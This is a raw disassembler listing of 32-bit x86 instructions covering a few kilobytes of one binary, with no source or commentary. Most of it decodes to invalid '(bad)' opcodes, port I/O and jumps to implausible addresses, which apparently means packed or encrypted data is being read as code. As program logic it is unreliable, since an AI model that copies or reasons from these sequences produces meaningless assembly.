  41eeb6:	mov    cl,0x1b
  41eeb8:	addr16 push 0x78
  41eebb:	adc    dl,BYTE PTR [ecx-0xb]
  41eebe:	adc    edi,esi
  41eec0:	daa    
  41eec1:	mov    dl,BYTE PTR [eax-0x37]
  41eec4:	pop    edx
  41eec5:	mov    cl,0xec
  41eec7:	(bad)  
  41eec8:	repz ror BYTE PTR [ecx],1
  41eecb:	push   ebx
  41eecc:	enter  0x1d49,0xd6
  41eed0:	mov    eax,ds:0xc079ddc2
  41eed5:	push   esp
  41eed6:	cwde   
  41eed7:	pop    edx
  41eed8:	dec    eax
  41eed9:	pop    ebx
  41eeda:	enter  0xc74f,0x56
  41eede:	outs   dx,DWORD PTR ds:[esi]
  41eedf:	cwde   
  41eee0:	push   esp
  41eee1:	in     eax,dx
  41eee2:	pop    edx
  41eee3:	jo     0x41ef4f
  41eee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee6:	inc    edi
  41eee7:	fld    DWORD PTR [esi]
  41eee9:	inc    esi
  41eeea:	jmp    0xc5e72b2a
  41eeef:	aam    0xb5
  41eef1:	cmp    al,0x73
  41eef3:	and    ebx,ebp
  41eef5:	cdq    
  41eef6:	lds    eax,FWORD PTR [edi]
  41eef8:	jnp    0x41ee9e
  41eefa:	scas   eax,DWORD PTR es:[edi]
  41eefb:	mov    ah,0xcb
  41eefd:	in     al,dx
  41eefe:	fs pop ebx
  41ef00:	cld    
  41ef01:	xor    al,0x2d
  41ef03:	(bad)  
  41ef04:	outs   dx,DWORD PTR ds:[esi]
  41ef05:	mov    bl,0x97
  41ef07:	jecxz  0x41ef0b
  41ef09:	leave  
  41ef0a:	cmc    
  41ef0b:	jmp    0x116bb1c
  41ef10:	mov    ah,0x8e
  41ef12:	lods   eax,DWORD PTR ds:[esi]
  41ef13:	daa    
  41ef14:	add    ecx,ebx
  41ef16:	inc    ebp
  41ef17:	(bad)  
  41ef18:	sahf   
  41ef19:	or     BYTE PTR ds:0x82ab690,dh
  41ef1f:	sti    
  41ef20:	(bad)  
  41ef21:	das    
  41ef22:	(bad)  
  41ef24:	(bad)  [ecx+0x165835c]
  41ef2a:	test   ch,ah
  41ef2c:	test   al,0x86
  41ef2e:	stos   DWORD PTR es:[edi],eax
  41ef2f:	sub    eax,0xd21e28c
  41ef34:	pop    edx
  41ef35:	mov    bh,0x3e
  41ef37:	imul   ecx,eax,0xffffffe5
  41ef3a:	lods   eax,DWORD PTR ds:[esi]
  41ef3b:	pop    es
  41ef3c:	and    ebx,esp
  41ef3e:	in     eax,dx
  41ef3f:	add    al,0xff
  41ef41:	repnz int3 
  41ef43:	in     al,0xe2
  41ef45:	stos   BYTE PTR es:[edi],al
  41ef46:	and    ecx,ebp
  41ef48:	(bad)  
  41ef49:	adc    DWORD PTR [ecx-0x4d7d1673],esp
  41ef4f:	(bad)  
  41ef50:	jmp    0x2e8d:0x982fbb2b
  41ef57:	dec    ebx
  41ef58:	imul   ecx,DWORD PTR [eax],0xffffffa8
  41ef5b:	pop    ebx
  41ef5c:	xchg   ch,bl
  41ef5e:	adc    eax,0x6e54a6cf
  41ef63:	imul   eax,DWORD PTR [esi-0x26],0xffffff97
  41ef67:	ja     0x41ef71
  41ef69:	add    eax,ebp
  41ef6b:	(bad)  
  41ef6c:	dec    edx
  41ef6e:	push   0xd0348738
  41ef73:	aad    0x7d
  41ef75:	stc    
  41ef76:	mov    eax,0xaa0d6eec
  41ef7b:	loopne 0x41ef30
  41ef7d:	or     al,BYTE PTR [ebx-0x39224866]
  41ef83:	pop    edx
  41ef84:	and    BYTE PTR [ebx-0xe349322],ch
  41ef8a:	loopne 0x41efbf
  41ef8c:	and    BYTE PTR [esi],cl
  41ef8e:	cmp    al,0x6e
  41ef90:	jmp    0x41ef8a
  41ef92:	xchg   BYTE PTR [ebx-0x781bb96d],cl
  41ef98:	mov    esp,0x7d3fc12b
  41ef9d:	xor    BYTE PTR [esi-0x61],cl
  41efa0:	mov    BYTE PTR [edx],dh
  41efa2:	test   eax,0x2c259598
  41efa7:	mov    bl,0xa4
  41efa9:	imul   BYTE PTR [ebp+0x23d949d3]
  41efaf:	cmp    edx,edx
  41efb1:	aaa    
  41efb2:	or     DWORD PTR [esi+0x60],ebx
  41efb5:	add    al,0xfe
  41efb7:	and    bh,BYTE PTR [esi+0x5a]
  41efba:	jae    0x41efd8
  41efbc:	(bad)
  41efbf:	cmp    ah,BYTE PTR [ebp+ecx*1+0x68]
  41efc3:	shr    edx,cl
  41efc5:	xchg   DWORD PTR [ebx+0x4d],ecx
  41efc8:	xchg   edi,eax
  41efc9:	sbb    eax,DWORD PTR ds:[eax+eiz*4]
  41efcd:	or     eax,0xdf6697a6
  41efd2:	xchg   esp,eax
  41efd3:	pusha  
  41efd4:	aam    0x4a
  41efd6:	xor    ebp,DWORD PTR [ebx+0xda55ac6]
  41efdc:	imul   esp,DWORD PTR [ebp-0x48acb5f2],0xffffffeb
  41efe3:	out    0x53,eax
  41efe5:	ins    DWORD PTR es:[edi],dx
  41efe6:	cmp    DWORD PTR [esi-0x54c07ee],edx
  41efec:	xor    DWORD PTR [eax],esi
  41efee:	push   edi
  41efef:	vandps xmm6,xmm4,XMMWORD PTR [edx*2-0x36717d5e]
  41eff8:	sub    al,0x79
  41effa:	pop    esp
  41effc:	mov    eax,0x2f9c235b
  41f001:	dec    edi
  41f002:	jb     0x41f045
  41f004:	loop   0x41f014
  41f006:	push   edi
  41f007:	pop    edi
  41f008:	inc    ebx
  41f009:	add    esp,edi
  41f00b:	int3   
  41f00c:	cli    
  41f00d:	and    eax,edx
  41f00f:	aas    
  41f010:	data16 shr dl,0x8
  41f014:	ins    BYTE PTR es:[edi],dx
  41f015:	inc    ecx
  41f016:	pop    esi
  41f017:	ret    0x87c6
  41f01a:	jecxz  0x41f093
  41f01c:	js     0x41efc9
  41f01e:	xor    esi,ebp
  41f020:	(bad)  
  41f022:	cld    
  41f023:	outs   dx,BYTE PTR ds:[esi]
  41f024:	adc    eax,0xe095be3
  41f029:	xor    ah,dh
  41f02b:	fmul   QWORD PTR [ebx+0x48]
  41f02e:	leave  
  41f02f:	aam    0x10
  41f031:	mov    ah,0x32
  41f033:	imul   DWORD PTR [eax-0x56]
  41f036:	jo     0x41f077
  41f038:	cmp    DWORD PTR [edi-0xe964c03],eax
  41f03e:	xor    edx,DWORD PTR [edi]
  41f040:	xlat   BYTE PTR ds:[ebx]
  41f041:	aaa    
  41f042:	sbb    cl,BYTE PTR [ebp*4+0x7a918e39]
  41f049:	ficom  WORD PTR [ecx]
  41f04b:	mov    ebx,0xc4e8db37
  41f050:	pop    edx
  41f051:	stos   DWORD PTR es:[edi],eax
  41f052:	inc    ebp
  41f053:	shr    ch,0x12
  41f056:	sbb    bl,cl
  41f058:	mov    ecx,0xcbc169a1
  41f05d:	mov    bl,al
  41f05f:	add    eax,0x9b853de6
  41f064:	cld    
  41f065:	xor    eax,0x11cbbafd
  41f06a:	mov    edi,0x3d59ce8f
  41f06f:	dec    edi
  41f070:	or     edx,DWORD PTR [esi+edx*2]
  41f073:	xadd   BYTE PTR [edx-0xc],bl
  41f077:	cwde   
  41f078:	push   ss
  41f079:	push   edx
  41f07a:	aas    
  41f07b:	cdq    
  41f07c:	xor    eax,0xc6557a1e
  41f081:	subps  xmm0,XMMWORD PTR [edi-0x59]
  41f085:	pop    eax
  41f086:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41f088:	inc    ebx
  41f089:	and    eax,0x5c4e3772
  41f08e:	mov    esi,0xf2710e0c
  41f093:	popf   
  41f094:	iret   
  41f095:	fcmovbe st,st(1)
  41f097:	adc    eax,0xb8e1e90f
  41f09c:	sub    DWORD PTR [edx],0xc38af566
  41f0a2:	adc    cl,BYTE PTR [edi+eax*8-0x7b]
  41f0a6:	xchg   BYTE PTR [ebx+0x2f],dh
  41f0a9:	iretw  
  41f0ab:	mov    dl,0xce
  41f0ad:	push   ss
  41f0ae:	outs   dx,BYTE PTR ds:[esi]
  41f0af:	dec    edx
  41f0b0:	mov    bl,0xb4
  41f0b2:	or     al,0x22
  41f0b4:	fcmovu st,st(3)
  41f0b6:	ret    
  41f0b7:	xlat   BYTE PTR ds:[ebx]
  41f0b8:	push   esi
  41f0b9:	dec    esi
  41f0ba:	jbe    0x41f047
  41f0bc:	add    al,0xa0
  41f0be:	out    0x47,al
  41f0c0:	test   BYTE PTR [edx],0x52
  41f0c3:	adc    BYTE PTR [edi-0x7250c7d1],bh
  41f0c9:	push   ebx
  41f0ca:	jecxz  0x41f063
  41f0cc:	adc    al,0xe6
  41f0ce:	push   edi
  41f0cf:	inc    eax
  41f0d0:	mov    dl,0x8
  41f0d2:	shl    ah,cl
  41f0d4:	pop    edi
  41f0d5:	xor    al,0x83
  41f0d7:	and    al,0xff
  41f0d9:	jbe    0x41f074
  41f0db:	dec    edi
  41f0dc:	pop    ss
  41f0dd:	mov    dh,0x30
  41f0df:	push   esi
  41f0e0:	aad    0xcf
  41f0e2:	fimul  WORD PTR [ebx]
  41f0e4:	(bad)  
  41f0e5:	rcl    BYTE PTR [edi-0x5b],cl
  41f0e8:	jbe    0x41f0ac
  41f0ea:	inc    edx
  41f0eb:	inc    eax
  41f0ec:	cmp    ebp,DWORD PTR [ecx-0x6dc619d3]
  41f0f2:	ins    BYTE PTR es:[edi],dx
  41f0f3:	inc    ebx
  41f0f4:	inc    ebx
  41f0f5:	fldcw  WORD PTR [esp+edi*8+0x1bd26ac7]
  41f0fc:	div    DWORD PTR [eax]
  41f0fe:	pop    edx
  41f0ff:	jne    0x41f121
  41f101:	popf   
  41f102:	sbb    DWORD PTR [edx+0x7f],ebx
  41f105:	sbb    edx,edi
  41f107:	sbb    eax,DWORD PTR [ecx-0x7b268c7]
  41f10d:	or     esi,DWORD PTR [ecx-0x4ee6b2f8]
  41f113:	cwde   
  41f114:	lea    edx,[eax+0x3120a32]
  41f11a:	cmp    esi,DWORD PTR [ecx+0x29]
  41f11d:	push   edx
  41f11e:	cwde   
  41f11f:	inc    eax
  41f120:	retf   0x9ffd
  41f123:	ja     0x41f0d1
  41f125:	pushf  
  41f126:	xchg   edx,eax
  41f127:	jo     0x41f12e
  41f129:	add    bl,BYTE PTR [ebx+edi*4]
  41f12c:	xchg   ebp,eax
  41f12d:	rcl    BYTE PTR [edi+edi*8+0x303bf202],0xc4
  41f135:	retf   0xb796
  41f138:	imul   esp,DWORD PTR [edi],0x3d16c838
  41f13e:	dec    esp
  41f13f:	ret    
  41f140:	rol    DWORD PTR [ecx-0x2d5ab007],1
  41f146:	dec    ecx
  41f147:	rol    DWORD PTR [ebx],0xaa
  41f14a:	dec    ecx
  41f14b:	and    eax,DWORD PTR [esi+0x276e888a]
  41f151:	mov    ecx,DWORD PTR [ecx+ecx*1+0x99540ec]
  41f158:	in     eax,dx
  41f159:	mov    ebp,0x2e95bdb9
  41f15e:	adc    eax,0x488120eb
  41f163:	xchg   esp,eax
  41f164:	retf   
  41f165:	xchg   ecx,eax
  41f166:	es sahf 
  41f168:	jb     0x41f1cf
  41f16a:	les    ebp,FWORD PTR [edx]
  41f16c:	je     0x41f0fb
  41f16e:	enter  0x571e,0xcf
  41f172:	or     BYTE PTR [ebp-0x25],ch
  41f175:	rol    al,cl
  41f177:	scas   al,BYTE PTR es:[edi]
  41f178:	(bad)  
  41f179:	jmp    0x41f1c0
  41f17b:	mov    al,0x59
  41f17d:	jmp    0x41f177
  41f17f:	xor    bh,BYTE PTR [eax+0x5236898e]
  41f185:	jg     0x41f15e
  41f187:	scas   al,BYTE PTR es:[edi]
  41f188:	dec    ebp
  41f189:	jbe    0x41f1f5
  41f18b:	or     edx,ebx
  41f18d:	(bad)  
  41f18e:	push   ebx
  41f18f:	xchg   ecx,eax
  41f190:	xchg   edx,eax
  41f191:	push   edx
  41f192:	lds    ebx,FWORD PTR [eax-0x7b]
  41f195:	mov    DWORD PTR [esi+0x736b2115],ebp
  41f19b:	in     eax,0x32
  41f19d:	mov    esp,0xab3b37fd
  41f1a2:	cmp    ecx,DWORD PTR [edx+0x20]
  41f1a5:	and    al,BYTE PTR [ebx+0xb]
  41f1a8:	in     al,dx
  41f1a9:	shr    BYTE PTR [ebx-0x2435b65d],0x65
  41f1b0:	js     0x41f1db
  41f1b2:	das    
  41f1b3:	mov    ebx,0x93ada1de
  41f1b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1b9:	(bad)  
  41f1ba:	pop    esp
  41f1bb:	inc    eax
  41f1bc:	das    
  41f1bd:	ret    
  41f1be:	pop    DWORD PTR [eax-0x69]
  41f1c1:	jecxz  0x41f1b2
  41f1c3:	shl    DWORD PTR ds:[esi-0x48],0xa1
  41f1c8:	retf   
  41f1c9:	push   cs
  41f1ca:	dec    edi
  41f1cb:	out    0x6f,eax
  41f1cd:	push   esp
  41f1ce:	js     0x41f1f6
  41f1d0:	cdq    
  41f1d1:	and    DWORD PTR [ecx],edi
  41f1d3:	std    
  41f1d4:	and    ebp,DWORD PTR [edx]
  41f1d6:	pop    ebp
  41f1d7:	pushf  
  41f1d8:	iret   
  41f1d9:	mov    esi,0x1f2cf92
  41f1de:	xchg   dh,ah
  41f1e0:	lahf   
  41f1e1:	dec    edi
  41f1e2:	push   0xffffffa9
  41f1e4:	mov    eax,ds:0x5d638526
  41f1e9:	(bad)  
  41f1ea:	scas   al,BYTE PTR es:[edi]
  41f1eb:	or     BYTE PTR [ecx],0xd9
  41f1ee:	add    cl,ah
  41f1f0:	bound  esp,QWORD PTR [ecx-0x73d2818e]
  41f1f6:	outs   dx,BYTE PTR ds:[esi]
  41f1f7:	push   esp
  41f1f8:	pusha  
  41f1f9:	icebp  
  41f1fa:	repnz sub eax,0xae5768
  41f200:	cld    
  41f201:	dec    esi
  41f202:	mov    al,0xa8
  41f204:	shld   DWORD PTR ds:0x9a0585e6,ebx,cl
  41f20b:	dec    esi
  41f20c:	mov    ecx,0x80ed550f
  41f211:	jb     0x41f1b4
  41f213:	and    al,0x4a
  41f215:	add    ah,BYTE PTR [edx]
  41f217:	outs   dx,DWORD PTR ds:[esi]
  41f218:	ds cld 
  41f21a:	repnz fist DWORD PTR [ebp+0x32e5b35]
  41f221:	lahf   
  41f222:	ret    0x80c5
  41f225:	xor    esp,DWORD PTR gs:[ebx+0x26]
  41f229:	das    
  41f22a:	shl    BYTE PTR [esi-0x5f94885d],0x8d
  41f231:	sub    al,0x40
  41f233:	sbb    esp,DWORD PTR [edi-0x653d46f8]
  41f239:	mov    al,0x7c
  41f23b:	pop    edx
  41f23c:	repz ficomp DWORD PTR [edi+0x6bbaee2b]
  41f243:	mov    WORD PTR [esi],es
  41f245:	add    ch,BYTE PTR [ebx]
  41f247:	pop    ds
  41f248:	hlt    
  41f249:	cmp    ecx,DWORD PTR [ebp+edx*4-0x396a1e27]
  41f250:	xchg   ebx,eax
  41f251:	pusha  
  41f252:	loope  0x41f1d5
  41f254:	jmp    0x2ce0b610
  41f259:	fistp  WORD PTR [ebp-0x55]
  41f25c:	aad    0x4
  41f25e:	mov    DWORD PTR [edx],esp
  41f260:	jle    0x41f27c
  41f262:	mov    ds:0xfe4f2ca1,al
  41f267:	sbb    DWORD PTR [edi],0x44108f07
  41f26d:	pop    edx
  41f26e:	loopne 0x41f22d
  41f270:	cmp    eax,eax
  41f272:	mov    ch,0x4
  41f274:	dec    ebx
  41f275:	ror    BYTE PTR [ebx-0x3e],0x14
  41f279:	clc    
  41f27a:	xchg   esp,eax
  41f27b:	xchg   ebp,eax
  41f27c:	das    
  41f27d:	addr16 (bad) 
  41f27f:	and    ch,dl
  41f281:	mov    ebx,0x1729de36
  41f286:	(bad)  [eax+0x4]
  41f289:	mov    esp,0xcfc2e2b
  41f28e:	hlt    
  41f28f:	scas   eax,DWORD PTR es:[edi]
  41f290:	cdq    
  41f291:	call   0x823e9eb3
  41f296:	das    
  41f297:	mov    ecx,0xc4503132
  41f29c:	mov    cl,dh
  41f29e:	push   eax
  41f29f:	retf   0xfc51
  41f2a2:	sub    cl,BYTE PTR [edx-0x7d]
  41f2a5:	and    BYTE PTR [esi],bl
  41f2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2a8:	pusha  
  41f2a9:	push   0x2e50e3f4
  41f2ae:	and    al,0xe8
  41f2b0:	add    DWORD PTR [ebx],edi
  41f2b2:	loop   0x41f280
  41f2b4:	into   
  41f2b5:	dec    esi
  41f2b6:	cmp    cl,ch
  41f2b8:	xchg   esi,eax
  41f2b9:	mov    BYTE PTR [ecx],ch
  41f2bb:	inc    esi
  41f2bc:	pop    eax
  41f2bd:	xchg   ebp,eax
  41f2be:	xchg   ebp,eax
  41f2bf:	inc    edx
  41f2c0:	xor    ch,BYTE PTR [esi]
  41f2c2:	lock adc dl,BYTE PTR [edx]
  41f2c5:	repz jmp 0x723a:0xc1bed9c5
  41f2cd:	imul   ebp,DWORD PTR [edx-0x5637fdb7],0x183338c6
  41f2d7:	iret   
  41f2d8:	sub    al,0xd
  41f2da:	cld    
  41f2db:	je     0x41f2e5
  41f2dd:	sub    eax,0x532ef798
  41f2e2:	xor    eax,0x927c28b0
  41f2e7:	mov    ecx,0x1f82ae4c
  41f2ec:	xor    eax,0xe65f3911
  41f2f1:	jp     0x41f311
  41f2f3:	pop    ecx
  41f2f4:	out    dx,al
  41f2f5:	mov    ebp,0xd80f1789
  41f2fa:	mov    eax,ss
  41f2fc:	xchg   ecx,eax
  41f2fd:	add    al,0x27
  41f2ff:	mov    ?,WORD PTR [ecx]
  41f301:	ds jbe 0x41f327
  41f304:	fcom   DWORD PTR [ebx]
  41f306:	pushf  
  41f307:	dec    ebp
  41f308:	cwde   
  41f309:	push   esp
  41f30a:	dec    esp
  41f30b:	jo     0x41f29c
  41f30d:	retf   0xd20d
  41f310:	hlt    
  41f311:	pop    ebx
  41f312:	fnstenv [ecx+0x3aa639b4]
  41f318:	cmp    DWORD PTR [eax-0x4312009d],esi
  41f31e:	inc    edi
  41f31f:	stos   DWORD PTR es:[edi],eax
  41f320:	ins    BYTE PTR es:[edi],dx
  41f321:	sbb    DWORD PTR [edi+0x3da850d5],esp
  41f327:	pminub mm5,QWORD PTR [edi]
  41f32a:	pop    ds
  41f32b:	xor    BYTE PTR [esi-0x235ecb7d],cl
  41f331:	or     BYTE PTR ds:0xa11e100d,bh
  41f337:	out    dx,eax
  41f338:	test   DWORD PTR cs:[edi-0x60cd033d],ebx
  41f33f:	lds    esp,FWORD PTR [ecx-0x29]
  41f342:	lahf   
  41f343:	idiv   DWORD PTR [ecx-0x5b]
  41f346:	loop   0x41f2e2
  41f348:	and    bh,BYTE PTR [edi+ebx*1-0xd4f9849]
  41f34f:	cmp    DWORD PTR [ebx+0x2dd585b],eax
  41f355:	imul   eax,ecx,0xa938110d
  41f35b:	and    esi,DWORD PTR [ecx+0xf]
  41f35e:	retf   
  41f35f:	shr    BYTE PTR ds:0xc64eb395,cl
  41f365:	popa   
  41f366:	mov    BYTE PTR [esi+0x53],cl
  41f369:	mov    eax,ds:0x9f335703
  41f36e:	jo     0x41f3d1
  41f370:	loope  0x41f342
  41f372:	jg     0x41f375
  41f374:	inc    eax
  41f375:	gs inc esp
  41f377:	(bad)  [esi+0x13]
  41f37a:	xchg   esp,eax
  41f37b:	mov    ds:0x82e9648d,al
  41f380:	pop    edi
  41f381:	xchg   edi,eax
  41f382:	enter  0x3942,0x4a
  41f386:	add    dh,BYTE PTR [eax+ecx*8-0x6]
  41f38a:	jmp    0x530b8af1
  41f38f:	mov    bl,0x70
  41f391:	jmp    0x41f348
  41f393:	dec    ecx
  41f394:	jae    0x41f3f5
  41f396:	cld    
  41f397:	scas   al,BYTE PTR es:[edi]
  41f398:	adc    dl,BYTE PTR [ebp-0x2d00f98e]
  41f39e:	jnp    0x41f3ab
  41f3a0:	push   esp
  41f3a1:	repz scas al,BYTE PTR es:[edi]
  41f3a3:	xchg   ebp,eax
  41f3a4:	rcl    DWORD PTR [edx],1
  41f3a6:	test   dh,0x2a
  41f3a9:	jns    0x41f36e
  41f3ab:	inc    bp
  41f3ad:	push   eax
  41f3ae:	shl    dh,0xb9
  41f3b1:	or     esp,DWORD PTR [edx+esi*8+0x2c]
  41f3b5:	mov    ds:0xcaba3a68,al
  41f3ba:	outs   dx,BYTE PTR ds:[esi]
  41f3bb:	xchg   ebp,eax
  41f3bc:	push   ds
  41f3bd:	std    
  41f3be:	stos   BYTE PTR es:[edi],al
  41f3bf:	pusha  
  41f3c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3c1:	arpl   ax,sp
  41f3c3:	call   0x96ac4899
  41f3c8:	test   al,0x57
  41f3ca:	shl    DWORD PTR [ebp+0x12bf2da3],0xe8
  41f3d1:	ins    BYTE PTR es:[edi],dx
  41f3d2:	pop    ecx
  41f3d3:	xchg   DWORD PTR ds:0xfcd9c7d1,ebp
  41f3d9:	retf   0xa43
  41f3dc:	xor    eax,0x9c01c21a
  41f3e1:	rcr    BYTE PTR [esp+eax*2-0x17bec6f2],1
  41f3e8:	out    dx,eax
  41f3e9:	xor    esp,DWORD PTR [edx]
  41f3eb:	cmp    DWORD PTR [esp+ebp*2+0x50a0f4c7],0xcdcc91f7
  41f3f6:	or     edi,ebx
  41f3f8:	dec    ecx
  41f3f9:	push   ebp
  41f3fa:	push   esi
  41f3fb:	push   0xffffffa8
  41f3fd:	cmp    ebp,DWORD PTR ds:0xb7f749f5
  41f403:	or     BYTE PTR [ecx+0x14],0x60
  41f407:	dec    esp
  41f408:	pop    ebx
  41f409:	add    eax,0x4932885c
  41f40e:	hlt    
  41f40f:	jns    0x41f411
  41f411:	pop    ebx
  41f412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f413:	add    bl,dl
  41f415:	inc    ebx
  41f416:	aaa    
  41f417:	aad    0xe6
  41f419:	sub    eax,0x3cbcae6a
  41f41e:	scas   eax,DWORD PTR es:[edi]
  41f41f:	mov    bx,0xb526
  41f423:	ja     0x41f3e4
  41f425:	pusha  
  41f426:	dec    ecx
  41f427:	jno    0x41f3f7
  41f429:	enter  0x7840,0x15
  41f42d:	pop    edx
  41f42e:	sbb    bl,BYTE PTR [esi+0x52]
  41f431:	push   esi
  41f432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f433:	ins    BYTE PTR es:[edi],dx
  41f434:	jae    0x41f43e
  41f436:	mov    DWORD PTR [ebx-0x2052b76f],esi
  41f43c:	and    al,0x7c
  41f43e:	mov    dl,0x32
  41f440:	jp     0x41f47f
  41f442:	cmp    dh,BYTE PTR [esi+0x29]
  41f445:	test   DWORD PTR [edi+0x16],esp
  41f448:	adc    eax,0xd5a957e4
  41f44d:	leave  
  41f44e:	xchg   esi,eax
  41f44f:	jle    0x41f43e
  41f451:	stos   BYTE PTR es:[edi],al
  41f452:	outs   dx,BYTE PTR ds:[esi]
  41f453:	cmp    dl,BYTE PTR [edx-0x47]
  41f456:	cmp    BYTE PTR [esi+esi*2+0x7c69c99f],bl
  41f45d:	xor    edx,DWORD PTR [ebp+ecx*1+0x32]
  41f461:	out    dx,al
  41f462:	aad    0x30
  41f464:	clc    
  41f465:	push   0x7d2c003f
  41f46a:	into   
  41f46b:	xchg   ebx,eax
  41f46c:	imul   ebp,DWORD PTR [edx-0x136696a7],0xdeed7b71
  41f476:	adc    eax,0x5c6d1c4e
  41f47b:	inc    edx
  41f47c:	lea    esp,[esi-0x2d]
  41f47f:	daa    
  41f480:	push   ss
  41f481:	sbb    ah,cl
  41f483:	das    
  41f484:	mov    ecx,0x5eee93b8
  41f489:	jmp    0x41f4c3
  41f48b:	xchg   ebp,eax
  41f48c:	test   DWORD PTR [edx+eax*8],ecx
  41f48f:	push   ebp
  41f490:	cli    
  41f491:	je     0x41f4d4
  41f493:	gs out dx,eax
  41f495:	lods   eax,DWORD PTR ds:[esi]
  41f496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f497:	and    dl,BYTE PTR [esi-0x30addd5f]
  41f49d:	xchg   esi,eax
  41f49e:	test   al,0xae
  41f4a0:	retf   0x1282
  41f4a3:	aam    0xb3
  41f4a5:	arpl   WORD PTR [esi-0x2],si
  41f4a8:	imul   ebp,DWORD PTR [ebx+0x71b579e],0xffffffcf
  41f4af:	outs   dx,DWORD PTR ds:[esi]
  41f4b0:	jns    0x41f4b1
  41f4b2:	mov    ch,0x5c
  41f4b4:	push   ss
  41f4b5:	ficom  WORD PTR [eax]
  41f4b7:	xor    DWORD PTR [eax-0x3a5a612e],eax
  41f4bd:	pushf  
  41f4be:	fwait
  41f4bf:	ins    DWORD PTR es:[edi],dx
  41f4c0:	add    bl,BYTE PTR [ecx-0x62ae8154]
  41f4c6:	inc    esp
  41f4c7:	add    ah,bh
  41f4c9:	xchg   esi,eax
  41f4ca:	cld    
  41f4cb:	pop    eax
  41f4cc:	arpl   WORD PTR [edi],cx
  41f4ce:	aam    0x8b
  41f4d0:	mov    eax,ds:0x3eb41c94
  41f4d5:	int    0x50
  41f4d7:	arpl   dx,dx
  41f4d9:	mov    ch,0xce
  41f4db:	cmp    al,0xa6
  41f4dd:	xchg   ch,bh
  41f4df:	rcl    BYTE PTR [edx-0x15],0x5a
  41f4e3:	fidivr DWORD PTR [ecx]
  41f4e6:	mov    al,0x40
  41f4e8:	cmc    
  41f4e9:	xchg   esp,eax
  41f4ea:	cmp    ch,BYTE PTR [eax+0x2ad09a61]
  41f4f0:	loop   0x41f4fb
  41f4f2:	lahf   
  41f4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4f4:	in     eax,0x5b
  41f4f6:	sub    al,cl
  41f4f8:	or     eax,ecx
  41f4fa:	pop    eax
  41f4fb:	mov    eax,ds:0xcc50fd90
  41f500:	inc    esi
  41f501:	sbb    esp,DWORD PTR [ebp-0x5afcde3e]
  41f507:	xor    BYTE PTR [ebx+0xd039092],bh
  41f50d:	call   0x3eaff0c1
  41f512:	mov    esp,0x7125f51b
  41f517:	mov    ebp,0x5277006d
  41f51c:	push   ebp
  41f51d:	adc    bl,bh
  41f51f:	inc    esi
  41f520:	(bad)  
  41f522:	mov    BYTE PTR [ebx+0x4f495459],al
  41f528:	lock dec ebp
  41f52a:	lods   al,BYTE PTR ds:[esi]
  41f52b:	and    al,0xbb
  41f52d:	and    al,0x4a
  41f52f:	xchg   edi,eax
  41f530:	es pop ebx
  41f532:	pop    ebp
  41f533:	fwait
  41f534:	push   ds
  41f535:	lds    eax,FWORD PTR [ebx+0x1d334a1f]
  41f53b:	xchg   ecx,eax
  41f53c:	cli    
  41f53d:	(bad)  
  41f53e:	mov    bl,0xeb
  41f540:	add    dl,BYTE PTR [ecx]
  41f542:	jmp    0x56dfbe0f
  41f547:	jns    0x41f4db
  41f549:	stc    
  41f54a:	sbb    al,0x57
  41f54c:	pop    ebp
  41f54d:	sbb    dh,al
  41f54f:	loopne 0x41f5b6
  41f551:	mov    ecx,0x385459b2
  41f556:	addr16 lahf 
  41f558:	dec    eax
  41f559:	(bad)  
  41f55a:	mov    edx,0xfd4a4202
  41f55f:	out    dx,eax
  41f560:	dec    BYTE PTR [ebp-0x2902cc60]
  41f566:	mov    eax,DWORD PTR [ecx-0x17]
  41f569:	fimul  WORD PTR [edi-0x36450c3f]
  41f56f:	cmp    ch,BYTE PTR [eax]
  41f571:	scas   eax,DWORD PTR es:[edi]
  41f572:	mov    al,BYTE PTR [ecx-0x18d35cc9]
  41f578:	push   ecx
  41f579:	add    edi,DWORD PTR [edi+0x43]
  41f57c:	add    dl,BYTE PTR [edi+esi*1-0x326ae86c]
  41f583:	jl     0x41f522
  41f585:	sub    esp,ecx
  41f587:	es inc ecx
  41f589:	retf   0xe7ce
  41f58c:	push   eax
  41f58d:	cmc    
  41f58e:	inc    esi
  41f58f:	mov    ch,0x50
  41f591:	in     al,0xd0
  41f593:	ret    
  41f594:	mov    DWORD PTR [esi-0x4e798cf5],edx
  41f59a:	add    ecx,DWORD PTR [eax-0x33]
  41f59d:	push   ecx
  41f59e:	push   es
  41f59f:	lds    ebx,FWORD PTR [esi-0x4f]
  41f5a2:	sbb    al,0xc7
  41f5a4:	(bad)  
  41f5a5:	stc    
  41f5a6:	aad    0x72
  41f5a8:	mov    ds:0x37a7228f,eax
  41f5ad:	mov    esi,DWORD PTR [esi-0x7433cc19]
  41f5b3:	pop    ecx
  41f5b4:	enter  0xbc5a,0x94
  41f5b8:	inc    esp
  41f5b9:	mov    ds:0x41929d26,al
  41f5be:	pop    sp
  41f5c0:	cmc    
  41f5c1:	test   al,0x3d
  41f5c3:	mov    al,ds:0x733eff83
  41f5c8:	dec    ebx
  41f5c9:	cli    
  41f5ca:	sbb    BYTE PTR [edx+0x67fa423d],dh
  41f5d0:	xlat   BYTE PTR ds:[ebx]
  41f5d1:	pop    ds
  41f5d2:	les    edx,FWORD PTR [eax]
  41f5d4:	mov    bl,0x8f
  41f5d6:	push   ecx
  41f5d7:	outs   dx,DWORD PTR ds:[esi]
  41f5d8:	stos   DWORD PTR es:[edi],eax
  41f5d9:	jnp    0x41f597
  41f5db:	(bad)  
  41f5dc:	sbb    al,0x2c
  41f5de:	aaa    
  41f5df:	mov    ah,0xa8
  41f5e1:	push   ebp
  41f5e2:	aam    0x34
  41f5e4:	add    ebx,ebx
  41f5e6:	sbb    al,0xd8
  41f5e8:	pop    ebp
  41f5e9:	fidiv  WORD PTR [esi]
  41f5eb:	xor    DWORD PTR [edi-0x52],0x5494f304
  41f5f2:	ret    0xbca8
  41f5f5:	push   0xffffffc3
  41f5f7:	cmp    bh,BYTE PTR [edx+0x62]
  41f5fa:	push   esi
  41f5fb:	push   ds
